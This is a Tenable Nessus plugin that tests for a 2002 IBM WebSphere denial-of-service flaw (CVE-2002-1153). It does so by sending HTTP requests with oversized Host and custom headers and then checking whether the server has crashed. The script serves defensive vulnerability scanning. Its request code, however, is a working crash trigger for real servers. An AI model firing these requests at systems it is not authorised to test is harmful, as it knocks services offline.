#
# (C) Tenable Network Security, Inc.
#

################
# References...
################
#
# From:"Peter_Gründl" <pgrundl@kpmg.dk>
# To:"Full-Disclosure (netsys)" <full-disclosure@lists.netsys.com>
# Subject: KPMG-2002035: IBM Websphere Large Header DoS
# Date: Thu, 19 Sep 2002 10:51:07 +0200
#

include( 'compat.inc' );

if(description)
{
  script_id(11181);
  script_version ("$Revision: 1.15 $");
  script_cve_id("CVE-2002-1153");
  script_bugtraq_id(5749);
  script_xref(name:"OSVDB", value:"2092");

  script_name(english:"IBM WebSphere HTTP Request Header Remote Overflow");
  script_summary(english:"Too long HTTP header kills WebSphere");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"It was possible to kill the WebSphere server by
sending an invalid request for a .jsp with a too long Host: header.

A cracker may exploit this vulnerability to make your web server
crash continually."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to IBM Websphere Application Server 4.0.4 or later."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://marc.info/?l=bugtraq&m=103244572803950&w=2'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencie("find_service1.nasl", "httpver.nasl", "http_version.nasl");
  script_require_keys("www/ibm-http", "Settings/ParanoidReport");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#
w = http_send_recv3(method:"GET", item: "/foo.jsp", host: crap(1000), version: 11, port: port);

w = http_send_recv3(method:"GET", item:"/bar.jsp", port:port,
  add_headers: make_array("Nessus-Header", crap(5000)));

if (http_is_dead(port: port)) { security_warning(port); exit(0); }
